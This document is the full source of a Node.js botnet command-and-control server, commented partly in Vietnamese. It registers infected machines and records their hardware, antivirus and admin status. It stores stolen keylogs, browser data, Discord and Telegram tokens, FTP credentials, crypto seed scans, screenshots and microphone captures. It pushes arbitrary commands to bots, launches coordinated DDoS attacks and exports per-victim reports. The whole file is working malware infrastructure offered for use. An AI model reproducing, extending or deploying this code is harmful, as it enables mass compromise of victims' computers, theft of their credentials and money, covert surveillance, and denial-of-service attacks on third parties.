// ============================================================
// BOTNET C&C SERVER - FULL COMPLETE - ĐỒNG BỘ BOT + PANEL
// ============================================================

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const morgan = require('morgan');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');

const JWT_SECRET = process.env.JWT_SECRET || 'botnet-jwt-secret-change-me-2024';
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'P@ssw0rd123!';
const PORT = process.env.PORT || 10000;
const DB_PATH = process.env.DB_PATH || path.join(__dirname, 'botnet.db');

let db;
let dbMode = 'sqlite3';

try {
    const Database = require('better-sqlite3');
    db = new Database(DB_PATH);
    db.pragma('journal_mode = WAL');
    db.pragma('foreign_keys = ON');
    dbMode = 'better-sqlite3';
    console.log('[+] Using better-sqlite3');
} catch (e) {
    const sqlite3 = require('sqlite3').verbose();
    db = new sqlite3.Database(DB_PATH);
    db.run('PRAGMA journal_mode = WAL');
    db.run('PRAGMA foreign_keys = ON');
    dbMode = 'sqlite3';
    console.log('[+] Using sqlite3 (fallback)');
}

console.log('[+] Database:', DB_PATH);

const basicSQL = `
    CREATE TABLE IF NOT EXISTS admins (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password_hash TEXT NOT NULL, created_at DATETIME DEFAULT CURRENT_TIMESTAMP);
    CREATE TABLE IF NOT EXISTS bots (bot_id TEXT PRIMARY KEY, hostname TEXT, username TEXT, os_version TEXT, os_arch TEXT, cpu_name TEXT, cpu_cores INTEGER, ram_total INTEGER, ram_available INTEGER, gpu_name TEXT, disk_info TEXT, ip_local TEXT, ip_public TEXT, mac_address TEXT, netbios TEXT, timezone TEXT, language TEXT, keyboard_layout TEXT, country TEXT, is_admin INTEGER DEFAULT 0, av_installed TEXT, uac_level TEXT, windows_update TEXT, is_vm INTEGER DEFAULT 0, home_dir TEXT, first_seen DATETIME DEFAULT CURRENT_TIMESTAMP, last_seen DATETIME DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'offline');
    CREATE TABLE IF NOT EXISTS bot_data (id INTEGER PRIMARY KEY AUTOINCREMENT, bot_id TEXT, data_type TEXT, data_content TEXT, captured_at DATETIME DEFAULT CURRENT_TIMESTAMP);
    CREATE TABLE IF NOT EXISTS attacks (attack_id TEXT PRIMARY KEY, target TEXT, method TEXT, port INTEGER, duration INTEGER, threads INTEGER, pps_limit INTEGER, status TEXT DEFAULT 'pending', started_at DATETIME DEFAULT CURRENT_TIMESTAMP, ended_at DATETIME);
    CREATE TABLE IF NOT EXISTS attack_bots (id INTEGER PRIMARY KEY AUTOINCREMENT, attack_id TEXT, bot_id TEXT, status TEXT DEFAULT 'assigned');
    CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, level TEXT DEFAULT 'info', source TEXT, bot_id TEXT, message TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP);
    CREATE TABLE IF NOT EXISTS commands (command_id TEXT PRIMARY KEY, bot_id TEXT, command_type TEXT, command_data TEXT, status TEXT DEFAULT 'pending', result TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP, executed_at DATETIME);
`;
if (dbMode === 'better-sqlite3') { db.exec(basicSQL); } else { db.exec(basicSQL); }
console.log('[+] Tables created');

function createDefaultAdmin() {
    const hash = bcrypt.hashSync(ADMIN_PASS, 12);
    if (dbMode === 'better-sqlite3') {
        const existing = db.prepare('SELECT * FROM admins WHERE username = ?').get(ADMIN_USER);
        if (!existing) { db.prepare('INSERT INTO admins (username, password_hash) VALUES (?, ?)').run(ADMIN_USER, hash); }
    } else {
        db.get('SELECT * FROM admins WHERE username = ?', [ADMIN_USER], (err, row) => {
            if (!row) { db.run('INSERT INTO admins (username, password_hash) VALUES (?, ?)', [ADMIN_USER, hash]); }
        });
    }
}
setTimeout(createDefaultAdmin, 1000);

const app = express();
const server = http.createServer(app);

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(morgan('dev'));
app.use('/api/', rateLimit({ windowMs: 15 * 60 * 1000, max: 1000 }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/methods', express.static(path.join(__dirname, 'methods')));

function authenticateJWT(req, res, next) {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
    try { req.user = jwt.verify(authHeader.split(' ')[1], JWT_SECRET); next(); }
    catch (err) { return res.status(401).json({ error: 'Invalid token' }); }
}

app.get('/', (req, res) => res.json({ status: 'online', server: 'Botnet C&C', version: '3.0' }));

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
    if (dbMode === 'better-sqlite3') {
        const admin = db.prepare('SELECT * FROM admins WHERE username = ?').get(username);
        if (!admin || !bcrypt.compareSync(password, admin.password_hash)) return res.status(401).json({ error: 'Invalid credentials' });
        const token = jwt.sign({ id: admin.id, username: admin.username, role: 'admin' }, JWT_SECRET, { expiresIn: '24h' });
        res.json({ token, expires_in: 86400 });
    } else {
        db.get('SELECT * FROM admins WHERE username = ?', [username], (err, admin) => {
            if (err || !admin || !bcrypt.compareSync(password, admin.password_hash)) return res.status(401).json({ error: 'Invalid credentials' });
            const token = jwt.sign({ id: admin.id, username: admin.username, role: 'admin' }, JWT_SECRET, { expiresIn: '24h' });
            res.json({ token, expires_in: 86400 });
        });
    }
});

app.get('/api/bots', authenticateJWT, (req, res) => {
    if (dbMode === 'better-sqlite3') { res.json({ bots: db.prepare('SELECT * FROM bots ORDER BY last_seen DESC').all() }); }
    else { db.all('SELECT * FROM bots ORDER BY last_seen DESC', [], (err, bots) => res.json({ bots: bots || [] })); }
});

app.get('/api/bots/:id', authenticateJWT, (req, res) => {
    const botId = req.params.id;
    if (dbMode === 'better-sqlite3') {
        const bot = db.prepare('SELECT * FROM bots WHERE bot_id = ?').get(botId);
        const data = db.prepare('SELECT * FROM bot_data WHERE bot_id = ? ORDER BY captured_at DESC').all(botId);
        res.json({ bot: bot || null, data: data || [] });
    } else {
        db.get('SELECT * FROM bots WHERE bot_id = ?', [botId], (err, bot) => {
            db.all('SELECT * FROM bot_data WHERE bot_id = ? ORDER BY captured_at DESC', [botId], (err, data) => {
                res.json({ bot: bot || null, data: data || [] });
            });
        });
    }
});

app.get('/api/bots/:id/export', authenticateJWT, (req, res) => {
    const botId = req.params.id;
    if (dbMode === 'better-sqlite3') {
        const bot = db.prepare('SELECT * FROM bots WHERE bot_id = ?').get(botId);
        const data = db.prepare('SELECT * FROM bot_data WHERE bot_id = ? ORDER BY captured_at DESC').all(botId);
        const txt = generateExportTXT(bot, data);
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.setHeader('Content-Disposition', `attachment; filename="victim_${botId.substring(0,12)}.txt"`);
        res.send(txt);
    } else {
        db.get('SELECT * FROM bots WHERE bot_id = ?', [botId], (err, bot) => {
            db.all('SELECT * FROM bot_data WHERE bot_id = ? ORDER BY captured_at DESC', [botId], (err, data) => {
                const txt = generateExportTXT(bot, data || []);
                res.setHeader('Content-Type', 'text/plain; charset=utf-8');
                res.setHeader('Content-Disposition', `attachment; filename="victim_${botId.substring(0,12)}.txt"`);
                res.send(txt);
            });
        });
    }
});

function generateExportTXT(bot, dataList) {
    let txt = '=== BOTNET VICTIM REPORT ===\n\n';
    if (bot) {
        txt += '--- SYSTEM INFO ---\n';
        txt += 'Bot ID: ' + (bot.bot_id||'?') + '\nHostname: ' + (bot.hostname||'?') + '\nOS: ' + (bot.os_version||'?') + ' (' + (bot.os_arch||'?') + ')\n';
        txt += 'CPU: ' + (bot.cpu_name||'?') + ' (' + (bot.cpu_cores||'?') + ' cores)\nRAM: ' + (bot.ram_total?(bot.ram_total/1073741824).toFixed(1)+'GB':'?') + '\n';
        txt += 'GPU: ' + (bot.gpu_name||'?') + '\nDisks: ' + (bot.disk_info||'?') + '\n';
        txt += 'IP Local: ' + (bot.ip_local||'?') + '\nIP Public: ' + (bot.ip_public||'?') + '\nMAC: ' + (bot.mac_address||'?') + '\n';
        txt += 'AV: ' + (bot.av_installed||'?') + '\nUAC: ' + (bot.uac_level||'?') + '\nVM: ' + (bot.is_vm?'Yes':'No') + '\nHome: ' + (bot.home_dir||'?') + '\n\n';
    }
    for (const d of dataList) {
        txt += '--- ' + d.data_type.toUpperCase() + ' ---\n';
        try {
            const c = JSON.parse(d.data_content);
            if (d.data_type === 'sensitive_files') { const files = c.files||[]; txt += 'Files: ' + (c.count||files.length) + '\n'; files.slice(0,30).forEach(f => txt += '  ' + (f.name||f) + ' (' + (f.size_bytes||0).toLocaleString() + 'B)\n'); }
            else if (d.data_type === 'installed_software') { const sw = c.software||[]; txt += 'Apps: ' + (c.count||sw.length) + '\n'; sw.slice(0,30).forEach(s => txt += '  ' + (s.name||s) + '\n'); }
            else if (d.data_type === 'running_processes') { const procs = c.processes||[]; txt += 'Processes: ' + (c.count||procs.length) + '\n'; procs.slice(0,30).forEach(p => txt += '  ' + (p.name||p) + ' PID:' + (p.pid||'?') + '\n'); }
            else if (d.data_type === 'keylog_data') { txt += 'Keylog:\n' + (c.data||'') + '\n'; }
            else { txt += JSON.stringify(c, null, 2) + '\n'; }
        } catch(e) { txt += d.data_content + '\n'; }
        txt += 'Captured: ' + (d.captured_at||'?') + '\n\n';
    }
    return txt;
}

app.get('/api/dashboard', authenticateJWT, (req, res) => {
    if (dbMode === 'better-sqlite3') {
        const total = db.prepare('SELECT COUNT(*) as c FROM bots').get();
        const online = db.prepare("SELECT COUNT(*) as c FROM bots WHERE status='online'").get();
        const attacks = db.prepare("SELECT COUNT(*) as c FROM attacks WHERE status='running'").get();
        res.json({ total_bots: total.c, online_bots: online.c, active_attacks: attacks.c });
    } else {
        db.get('SELECT COUNT(*) as c FROM bots', [], (e,t) => {
            db.get("SELECT COUNT(*) as c FROM bots WHERE status='online'", [], (e,o) => {
                db.get("SELECT COUNT(*) as c FROM attacks WHERE status='running'", [], (e,a) => {
                    res.json({ total_bots: t?.c||0, online_bots: o?.c||0, active_attacks: a?.c||0 });
                });
            });
        });
    }
});

app.get('/api/logs', authenticateJWT, (req, res) => {
    const limit = parseInt(req.query.limit) || 100;
    if (dbMode === 'better-sqlite3') { res.json({ logs: db.prepare('SELECT * FROM logs ORDER BY created_at DESC LIMIT ?').all(limit) }); }
    else { db.all('SELECT * FROM logs ORDER BY created_at DESC LIMIT ?', [limit], (err, logs) => res.json({ logs: logs || [] })); }
});

app.post('/api/attack/start', authenticateJWT, (req, res) => {
    const { target, method, port, duration, threads, pps_limit } = req.body;
    if (!target || !method || !duration) return res.status(400).json({ error: 'target, method, duration required' });
    const attackId = uuidv4();
    if (dbMode === 'better-sqlite3') {
        db.prepare('INSERT INTO attacks (attack_id, target, method, port, duration, threads, pps_limit, status) VALUES (?,?,?,?,?,?,?,?)').run(attackId, target, method, port||443, duration, threads||100, pps_limit||0, 'running');
        const onlineBots = db.prepare("SELECT bot_id FROM bots WHERE status='online'").all();
        onlineBots.forEach(b => db.prepare('INSERT INTO attack_bots (attack_id, bot_id) VALUES (?,?)').run(attackId, b.bot_id));
        broadcastToBots({ type: 'ddos_start', attack_id: attackId, method, params: { target, port: port||443, duration, threads: threads||100 } });
        res.json({ attack_id: attackId, bots_used: onlineBots.length, status: 'running' });
    } else {
        db.run('INSERT INTO attacks (attack_id, target, method, port, duration, threads, pps_limit, status) VALUES (?,?,?,?,?,?,?,?)', [attackId, target, method, port||443, duration, threads||100, pps_limit||0, 'running']);
        db.all("SELECT bot_id FROM bots WHERE status='online'", [], (err, onlineBots) => {
            (onlineBots||[]).forEach(b => db.run('INSERT INTO attack_bots (attack_id, bot_id) VALUES (?,?)', [attackId, b.bot_id]));
            broadcastToBots({ type: 'ddos_start', attack_id: attackId, method, params: { target, port: port||443, duration, threads: threads||100 } });
            res.json({ attack_id: attackId, bots_used: (onlineBots||[]).length, status: 'running' });
        });
    }
});

app.post('/api/attack/stop', authenticateJWT, (req, res) => {
    const { attack_id } = req.body;
    if (!attack_id) return res.status(400).json({ error: 'attack_id required' });
    if (dbMode === 'better-sqlite3') { db.prepare("UPDATE attacks SET status='stopped', ended_at=CURRENT_TIMESTAMP WHERE attack_id=?").run(attack_id); }
    else { db.run("UPDATE attacks SET status='stopped', ended_at=CURRENT_TIMESTAMP WHERE attack_id=?", [attack_id]); }
    broadcastToBots({ type: 'ddos_stop', attack_id });
    res.json({ status: 'stopped' });
});

// GỬI LỆNH ĐẾN BOT
app.post('/api/bots/:id/command', authenticateJWT, (req, res) => {
    const botId = req.params.id;
    const { command_type, command_data } = req.body;
    if (!command_type) return res.status(400).json({ error: 'command_type required' });
    const commandId = uuidv4();
    
    if (dbMode === 'better-sqlite3') {
        db.prepare('INSERT INTO commands (command_id, bot_id, command_type, command_data) VALUES (?,?,?,?)').run(commandId, botId, command_type, JSON.stringify(command_data||{}));
    } else {
        db.run('INSERT INTO commands (command_id, bot_id, command_type, command_data) VALUES (?,?,?,?)', [commandId, botId, command_type, JSON.stringify(command_data||{})]);
    }
    
    // GỬI LỆNH NGAY LẬP TỨC QUA WEBSOCKET
    const botWs = connectedBots.get(botId);
    if (botWs && botWs.readyState === WebSocket.OPEN) {
        botWs.send(JSON.stringify({
            type: 'command',
            command_id: commandId,
            command_type: command_type,
            command_data: command_data || {}
        }));
        console.log('[+] Command sent to bot:', botId, command_type);
    } else {
        console.log('[!] Bot not connected via WS, command queued:', botId);
    }
    
    db.run('INSERT INTO logs (level, source, bot_id, message) VALUES (?,?,?,?)', ['info', 'command', botId, `Command: ${command_type}`]);
    res.json({ command_id: commandId, status: botWs ? 'sent' : 'queued' });
});

// API NHẬN DATA TỪ BOT QUA HTTP
app.post('/api/bot_data', (req, res) => {
    const msg = req.body;
    if (!msg || !msg.bot_id) return res.status(400).json({ error: 'bot_id required' });
    const botId = msg.bot_id;
    const botIP = req.ip || req.socket.remoteAddress || 'unknown';
    
    if (dbMode === 'better-sqlite3') {
        const existing = db.prepare('SELECT * FROM bots WHERE bot_id = ?').get(botId);
        if (existing) { db.prepare("UPDATE bots SET status='online', last_seen=CURRENT_TIMESTAMP, ip_public=? WHERE bot_id=?").run(botIP, botId); }
        else { db.prepare("INSERT INTO bots (bot_id, hostname, status, ip_public, first_seen, last_seen) VALUES (?,'Unknown','online',?,CURRENT_TIMESTAMP,CURRENT_TIMESTAMP)").run(botId, botIP); }
    } else {
        db.get('SELECT * FROM bots WHERE bot_id = ?', [botId], (err, row) => {
            if (row) { db.run("UPDATE bots SET status='online', last_seen=CURRENT_TIMESTAMP, ip_public=? WHERE bot_id=?", [botIP, botId]); }
            else { db.run("INSERT INTO bots (bot_id, hostname, status, ip_public, first_seen, last_seen) VALUES (?,'Unknown','online',?,CURRENT_TIMESTAMP,CURRENT_TIMESTAMP)", [botId, botIP]); }
        });
    }
    
    if (msg.type === 'system_info') {
        if (dbMode === 'better-sqlite3') {
            db.prepare("UPDATE bots SET hostname=?, os_version=?, os_arch=?, cpu_name=?, cpu_cores=?, ram_total=?, ram_available=?, ip_local=?, mac_address=?, home_dir=?, last_seen=CURRENT_TIMESTAMP WHERE bot_id=?").run(msg.hostname||'?', msg.os_version||'', msg.os_arch||'', msg.cpu_model||'', msg.cpu_cores||0, parseInt((msg.total_ram_gb||0)*1073741824), parseInt((msg.free_ram_gb||0)*1073741824), msg.local_ip||'', msg.mac_address||'', msg.home_dir||'', botId);
        }
    }
    if (msg.type && msg.type !== 'heartbeat' && msg.type !== 'system_info') {
        if (dbMode === 'better-sqlite3') { db.prepare('INSERT INTO bot_data (bot_id, data_type, data_content) VALUES (?,?,?)').run(botId, msg.type, JSON.stringify(msg)); }
        else { db.run('INSERT INTO bot_data (bot_id, data_type, data_content) VALUES (?,?,?)', [botId, msg.type, JSON.stringify(msg)]); }
    }
    if (msg.type === 'heartbeat') {
        if (dbMode === 'better-sqlite3') { db.prepare("UPDATE bots SET status='online', last_seen=CURRENT_TIMESTAMP WHERE bot_id=?").run(botId); }
        else { db.run("UPDATE bots SET status='online', last_seen=CURRENT_TIMESTAMP WHERE bot_id=?", [botId]); }
    }
    res.json({ status: 'ok' });
});
// ============================================================
// API DELETE BOT
// ============================================================
app.delete('/api/bots/:id', authenticateJWT, (req, res) => {
    const botId = req.params.id;
    if (dbMode === 'better-sqlite3') {
        db.prepare('DELETE FROM bot_data WHERE bot_id = ?').run(botId);
        db.prepare('DELETE FROM attack_bots WHERE bot_id = ?').run(botId);
        db.prepare('DELETE FROM commands WHERE bot_id = ?').run(botId);
        db.prepare('DELETE FROM bots WHERE bot_id = ?').run(botId);
    } else {
        db.run('DELETE FROM bot_data WHERE bot_id = ?', [botId]);
        db.run('DELETE FROM attack_bots WHERE bot_id = ?', [botId]);
        db.run('DELETE FROM commands WHERE bot_id = ?', [botId]);
        db.run('DELETE FROM bots WHERE bot_id = ?', [botId]);
    }
    db.run('INSERT INTO logs (level, source, message) VALUES (?,?,?)', ['info', 'system', 'Bot deleted: ' + botId]);
    res.json({ status: 'deleted' });
});
// ============================================================
// WEBSOCKET
// ============================================================
const wss = new WebSocket.Server({ server });
const connectedBots = new Map();
const adminConnections = new Set();

function broadcastToBots(data) {
    const msg = JSON.stringify(data);
    connectedBots.forEach((ws) => { if (ws.readyState === WebSocket.OPEN) ws.send(msg); });
}

wss.on('connection', (ws, req) => {
    let botId = null;
    let isAdmin = false;
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data.toString());

            if (msg.type === 'auth') {
                if (msg.role === 'bot') {
                    botId = msg.bot_id || uuidv4();
                    const botIP = req.socket.remoteAddress || 'unknown';
                    ws._botIP = botIP;
                    connectedBots.set(botId, ws);
                    
                    if (dbMode === 'better-sqlite3') {
                        const existing = db.prepare('SELECT * FROM bots WHERE bot_id = ?').get(botId);
                        if (existing) { db.prepare("UPDATE bots SET status='online', last_seen=CURRENT_TIMESTAMP, ip_public=? WHERE bot_id=?").run(botIP, botId); }
                        else { db.prepare("INSERT INTO bots (bot_id, hostname, status, ip_public, first_seen, last_seen) VALUES (?,'Unknown','online',?,CURRENT_TIMESTAMP,CURRENT_TIMESTAMP)").run(botId, botIP); }
                    } else {
                        db.run("UPDATE bots SET status='online', last_seen=CURRENT_TIMESTAMP, ip_public=? WHERE bot_id=?", [botIP, botId]);
                        db.run("INSERT OR IGNORE INTO bots (bot_id, hostname, status, ip_public, first_seen, last_seen) VALUES (?,'Unknown','online',?,CURRENT_TIMESTAMP,CURRENT_TIMESTAMP)", [botId, botIP]);
                    }
                    ws.send(JSON.stringify({ type: 'auth_success', bot_id: botId }));
                    console.log('[+] Bot WS:', botId);
                    adminConnections.forEach(a => { if (a.readyState === WebSocket.OPEN) a.send(JSON.stringify({ type: 'bot_online', bot_id: botId })); });
                } else if (msg.role === 'admin') {
                    try { jwt.verify(msg.token, JWT_SECRET); isAdmin = true; adminConnections.add(ws); ws.send(JSON.stringify({ type: 'auth_success', role: 'admin' })); }
                    catch (e) { ws.send(JSON.stringify({ type: 'auth_error', error: 'Invalid token' })); }
                }
                return;
            }

            if (botId && msg.type === 'heartbeat') {
                ws.isAlive = true;
                if (dbMode === 'better-sqlite3') { db.prepare('UPDATE bots SET last_seen=CURRENT_TIMESTAMP WHERE bot_id=?').run(botId); }
                else { db.run('UPDATE bots SET last_seen=CURRENT_TIMESTAMP WHERE bot_id=?', [botId]); }
                
                // Kiểm tra commands pending
                if (dbMode === 'better-sqlite3') {
                    const pendingCmds = db.prepare("SELECT * FROM commands WHERE bot_id=? AND status='pending' ORDER BY created_at ASC LIMIT 5").all(botId);
                    pendingCmds.forEach(cmd => {
                        ws.send(JSON.stringify({ type: 'command', command_id: cmd.command_id, command_type: cmd.command_type, command_data: JSON.parse(cmd.command_data||'{}') }));
                        db.prepare("UPDATE commands SET status='sent', executed_at=CURRENT_TIMESTAMP WHERE command_id=?").run(cmd.command_id);
                    });
                }
                return;
            }

            if (botId && msg.type === 'bot_info') {
                if (dbMode === 'better-sqlite3') { db.prepare('UPDATE bots SET hostname=?, os_version=?, cpu_name=?, ram_total=?, ip_local=?, ip_public=?, country=?, is_admin=?, av_installed=?, last_seen=CURRENT_TIMESTAMP WHERE bot_id=?').run(msg.hostname, msg.os_version, msg.cpu_name, msg.ram_total, msg.ip_local, msg.ip_public, msg.country, msg.is_admin?1:0, msg.av_installed, botId); }
                return;
            }

            if (botId && msg.type === 'system_info') {
                if (dbMode === 'better-sqlite3') {
                    db.prepare("UPDATE bots SET hostname=?, os_version=?, os_arch=?, cpu_name=?, cpu_cores=?, ram_total=?, ram_available=?, ip_local=?, mac_address=?, home_dir=?, last_seen=CURRENT_TIMESTAMP WHERE bot_id=?").run(msg.hostname, msg.os_version, msg.os_arch, msg.cpu_model, msg.cpu_cores, Math.floor(msg.total_ram_gb*1073741824), Math.floor(msg.free_ram_gb*1073741824), msg.local_ip, msg.mac_address, msg.home_dir, botId);
                }
                console.log('[+] System info:', botId);
                return;
            }

            if (botId && (msg.type === 'sensitive_files' || msg.type === 'browser_data' || msg.type === 'installed_software' || msg.type === 'running_processes' || msg.type === 'discord_tokens' || msg.type === 'telegram_session' || msg.type === 'steam_data' || msg.type === 'ftp_credentials' || msg.type === 'keylog_data' || msg.type === 'clipboard' || msg.type === 'webcam_status' || msg.type === 'browser_history' || msg.type === 'crypto_seed_scan' || msg.type === 'microphone' || msg.type === 'screenshot')) {
                if (dbMode === 'better-sqlite3') { db.prepare('INSERT INTO bot_data (bot_id, data_type, data_content) VALUES (?,?,?)').run(botId, msg.type, JSON.stringify(msg)); }
                else { db.run('INSERT INTO bot_data (bot_id, data_type, data_content) VALUES (?,?,?)', [botId, msg.type, JSON.stringify(msg)]); }
                console.log('[+] Data:', msg.type, 'from', botId);
                return;
            }

            if (botId && msg.type === 'command_result') {
                if (dbMode === 'better-sqlite3') { db.prepare("UPDATE commands SET status='executed', result=? WHERE command_id=?").run(JSON.stringify(msg.result), msg.command_id); }
                console.log('[+] Command result:', botId);
                return;
            }

            if (botId && msg.type === 'attack_status') {
                adminConnections.forEach(a => { if (a.readyState === WebSocket.OPEN) a.send(JSON.stringify(msg)); });
                return;
            }

        } catch (e) { console.error('[-] WS error:', e.message); }
    });

    ws.on('close', () => {
        if (botId) {
            connectedBots.delete(botId);
            if (dbMode === 'better-sqlite3') { db.prepare("UPDATE bots SET status='offline' WHERE bot_id=?").run(botId); }
            else { db.run("UPDATE bots SET status='offline' WHERE bot_id=?", [botId]); }
            adminConnections.forEach(a => { if (a.readyState === WebSocket.OPEN) a.send(JSON.stringify({ type: 'bot_offline', bot_id: botId })); });
        }
        if (isAdmin) adminConnections.delete(ws);
    });
});

setInterval(() => { wss.clients.forEach(ws => { if (ws.isAlive === false) return ws.terminate(); ws.isAlive = false; ws.ping(); }); }, 30000);

server.listen(PORT, () => {
    console.log(`[+] Server running on port ${PORT}`);
    console.log(`[+] API: http://localhost:${PORT}/api`);
    console.log(`[+] WebSocket: ws://localhost:${PORT}`);
});
